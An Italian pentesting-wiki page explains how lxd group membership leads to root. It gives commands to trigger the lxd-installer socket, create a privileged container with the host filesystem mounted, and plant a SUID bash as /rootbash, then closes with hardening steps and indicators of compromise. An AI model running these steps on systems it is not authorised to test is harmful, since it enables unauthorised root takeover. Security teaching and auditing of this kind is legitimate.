# Gruppo lxd/lxc - Escalation dei privilegi

{{#include ../../../banners/hacktricks-training.md}}

L'appartenenza al gruppo di gestione LXD dell'host (normalmente _**lxd**_) può offrire un percorso verso root, consentendo il controllo completo del daemon.<sup>[[1]](#references)</sup> Si tratta dello stesso problema relativo ai confini di fiducia descritto per [runtime control sockets](../../containers-namespaces/container-security/runtime-api-and-daemon-exposure.md) e [writable host mounts](../../containers-namespaces/container-security/sensitive-host-mounts.md): l'accesso all'API di gestione può essere sufficiente anche quando il processo corrente non si trova già all'interno di un container.<sup>[[1]](#references)</sup>

## Attivazione tramite socket di Ubuntu `lxd-installer`

Non dare per scontato che l'appartenenza al gruppo `lxd` sia innocua solo perché lo snap LXD è assente. Su Ubuntu Server 24.04 e versioni successive, il pacchetto `lxd-installer` preinstallato espone `/run/lxd-installer.socket` con proprietario `root:lxd` e modalità `0660`. Una connessione attiva `lxd-installer@.service` come root, installando lo snap LXD senza password sudo né autorizzazione polkit; alcune versioni del wrapper, inoltre, omettono la richiesta di conferma quando lo standard input non è un TTY.<sup>[[10]](#references)[[11]](#references)</sup>

Esamina sia l'appartenenza dell'account ai gruppi, sia il servizio attivato tramite socket:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
id -nG
getent group lxd
stat -c '%A %U:%G %n' /run/lxd-installer.socket
systemctl cat lxd-installer.socket lxd-installer@.service
```

Un test autorizzato del gruppo `lxd` può attivare l'installer tramite il normale wrapper `lxc` oppure collegandosi direttamente al socket. Quest'ultimo caso mostra che il confine di autorizzazione effettivo è l'ACL del socket Unix, non il prompt del wrapper:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
lxc version
```

Una volta che il daemon è disponibile, continua con le tecniche per i container privilegiati riportate di seguito.<sup>[[10]](#references)[[11]](#references)</sup>

## Exploiting senza internet

### Metodo 1

Puoi scaricare un'immagine Alpine da usare con LXD da un repository attendibile.
Il server di immagini LXD di Canonical pubblica build giornaliere: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Scarica sia **lxd.tar.xz** sia **rootfs.squashfs** dalla build più recente (il nome della directory corrisponde alla data).<sup>[[8]](#references)</sup>

In alternativa, puoi installare distrobuilder sul tuo computer seguendo le [istruzioni del progetto](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

Carica **incus.tar.xz** (**lxd.tar.xz** se hai scaricato dal server di immagini Canonical) e **rootfs.squashfs**, quindi importa l'immagine e crea un container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> Se trovi questo errore _**Errore: non è stato trovato alcun pool di archiviazione. Crea un nuovo pool di archiviazione**_\
> Esegui **`lxd init`**, configura un pool di archiviazione predefinito, quindi **ripeti** il blocco di comandi precedente.<sup>[[2]](#references)</sup>

Infine, avvia il container e apri una shell root sul filesystem dell’host:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

Poiché UID 0 in questa istanza privilegiata non viene rimappato, può creare un payload SUID di proprietà dell'host tramite la root dell'host montata. Questo completa il pivot da container a host, invece di lasciare l'operatore in una shell del container:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
# From the host, write the payload through the privileged container
lxc exec privesc -- /bin/sh -c 'cp /mnt/root/bin/bash /mnt/root/rootbash && chmod 4755 /mnt/root/rootbash'

# Execute on the host; -p prevents bash from dropping the SUID-derived EUID
/rootbash -p
id
```

Posiziona il payload su un filesystem che supporta SUID. Una partizione `/tmp` separata è comunemente montata con `nosuid` e potrebbe non essere visibile tramite un bind non ricorsivo di `/` sull’host, quindi un percorso come `/rootbash` sul filesystem root dell’host è più affidabile per questa dimostrazione.<sup>[[10]](#references)[[11]](#references)</sup>

### Method 2

Crea un’immagine Alpine e avviala con il flag `security.privileged=true`, che mappa root del container su root dell’host; montare `/` espone quindi il filesystem dell’host all’interno del container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## Effetto collaterale di AppArmor sull'intero host

L'avvio dello snap LXD può anche scrivere `/run/sysctl.d/zz-lxd.conf` e impostare sia `kernel.apparmor_restrict_unprivileged_userns` sia `kernel.apparmor_restrict_unprivileged_unconfined` su `0`. Questo indebolisce le restrizioni di Ubuntu sugli user namespace non privilegiati per tutti gli utenti locali; durante la valutazione dell'host, annota quindi i valori prima e dopo l'attivazione di LXD.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
cat /run/sysctl.d/zz-lxd.conf 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns \
       kernel.apparmor_restrict_unprivileged_unconfined
```

## Audit e hardening

Considera l’appartenenza a `lxd` come una concessione di privilegi root. La rimozione di un membro non necessario ha effetto sulle nuove sessioni di login; la rimozione di `lxd-installer` o il mascheramento del suo socket elimina soltanto il percorso di installazione on-demand e **non** limita un utente che può già raggiungere un daemon LXD installato.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
getent group lxd
sudo gpasswd -d <user> lxd

# Only if on-demand LXD installation is not required
sudo systemctl mask --now lxd-installer.socket
# or: sudo apt purge lxd-installer
```

Indicatori utili di compromissione includono istanze LXD con `security.privileged=true`, dispositivi disco il cui `source` è `/`, connessioni inattese a `/run/lxd-installer.socket`, nuovi file SUID e il passaggio da `1` a `0` dei sysctl di AppArmor indicati sopra.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
lxc list
lxc config show <instance> --expanded
find / -xdev -type f -perm -4000 2>/dev/null
```

## References

- [1] [Come rafforzare la sicurezza di LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [Container e macchine virtuali LXD](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Come copiare e importare immagini](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Come creare immagini con distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Definizione dell'immagine Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [Script di compilazione di lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [Server di immagini LXD](https://images.lxd.canonical.com/)
- [9] [Tipo: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
- [10] [Report e PoC di STAR Labs sull'escalation dei privilegi tramite il gruppo LXD](https://github.com/star-sg/lxd-group-privesc-report)
- [11] [Vino vecchio in una bottiglia nuova: il gruppo LXD, vecchio di un decennio, torna a ottenere privilegi root](https://starlabs.sg/blog/2026/06-old-wine-in-a-new-bottle-a-decade-old-lxd-group-root-re-armed)
{{#include ../../../banners/hacktricks-training.md}}
